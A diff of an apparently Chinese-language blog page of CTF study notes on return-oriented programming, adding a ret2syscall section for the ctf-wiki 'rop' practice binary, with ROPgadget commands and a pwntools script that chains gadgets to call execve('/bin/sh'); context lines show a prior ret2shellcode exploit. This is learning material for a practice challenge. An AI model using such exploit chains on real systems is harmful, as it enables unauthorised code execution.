@@ -166,7 +166,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="3">
-<input type="hidden" id="yelog_site_word_count" value="1.3k">
+<input type="hidden" id="yelog_site_word_count" value="1.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -285,12 +285,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-26 23:41:29'>2019-11-26 23:21</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-27 01:12:45'>2019-11-26 23:21</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:374</span>
+        <span>字数:587</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -320,7 +320,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode-NX-off"><span class="toc-text">ret2shellcode (NX off)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode-NX-off"><span class="toc-text">ret2shellcode (NX off)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall（NX-on）"><span class="toc-text">ret2syscall（NX on）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -393,6 +393,42 @@ shellcode = asm(shellcraft.sh())
 
 p.sendline(shellcode)
 p.interactive()</code></pre>
+<h2 id="ret2syscall（NX-on）"><a href="#ret2syscall（NX-on）" class="headerlink" title="ret2syscall（NX on）"></a>ret2syscall（NX on）</h2><blockquote>
+<p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a></p>
+</blockquote>
+<p>offset 和前面一样还是 112，不同的是 NX 开启，不能像 ret2shellcode 那样读 shellcode 到一个 buf。这里用 ret2syscall:</p>
+<p>所需要各个寄存器的值：</p>
+<ol>
+<li>eax 为 0xb，也就是 execve 调用号</li>
+<li>ebx 为 ‘/bin/sh’ 字符串的地址</li>
+<li>ecx 和 edx 为0</li>
+</ol>
+<p>借助 ROPgadget：</p>
+<pre><code class="bash">ROPgadget --binary ./ret2syscall --only &quot;int&quot;
+
+ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;eax&quot;
+
+ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;edx&quot;
+
+ROPgadget --binary ./ret2syscall --str=&quot;/bin/sh&quot;</code></pre>
+<p>exp:</p>
+<pre><code class="python">from pwn import *
+p = process(&quot;./ret2syscall&quot;)
+# p = remote(&quot;127.0.0.1&quot;,4000)
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+
+# elf = ELF(&quot;./&quot;)
+# eax = 11,ebx = sh_addr,ecx = edx = 0 
+pop_eax = 0x080bb196
+pop_edx_ecx_ebx = 0x0806eb90
+sys_addr = 0x08049421
+sh_addr = 0x080be408
+gdb.attach(p)
+payload = &#39;\x90&#39;*112 + p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(sh_addr) + p32(sys_addr)
+
+p.sendline(payload)
+p.interactive()</code></pre>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
 <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode</a></p>
 </blockquote>
@@ -406,10 +442,10 @@ p.interactive()</code></pre>
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>ROP - CTFwiki</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">374</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">587</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="知弦">知弦</a></p>
     <p><span class="copy-title">发布时间:</span>2019-11-26, 23:21:07</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-26, 23:41:29</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-27, 01:12:45</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/26/ROP-CTFwiki/" title="ROP - CTFwiki">http://zh1x1an.com/2019/11/26/ROP-CTFwiki/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
